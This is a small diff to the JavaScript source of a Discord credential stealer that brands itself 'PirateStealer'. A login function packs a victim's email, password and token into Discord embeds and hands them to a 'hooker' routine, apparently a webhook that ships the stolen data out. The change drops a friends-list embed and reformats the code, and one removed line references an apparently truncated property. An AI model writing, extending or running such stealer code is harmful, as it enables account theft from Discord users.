@@ -664,22 +664,10 @@ const login = async (email, password, token) => {
         },
         thumbnail: {
           url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        }
-    }, {
-        "title": `Total Friends (${friends.length})`,
-        "color": config['embed-color'],
-        "description": friends.frien,
-        "author": {
-            "name": "PirateStealer"
         },
-        "footer": {
-            "text": "PirateStealer"
-        },
-        "thumbnail": {
-            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-        }
-    }]
-}
+      },
+    ],
+  };
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
 };
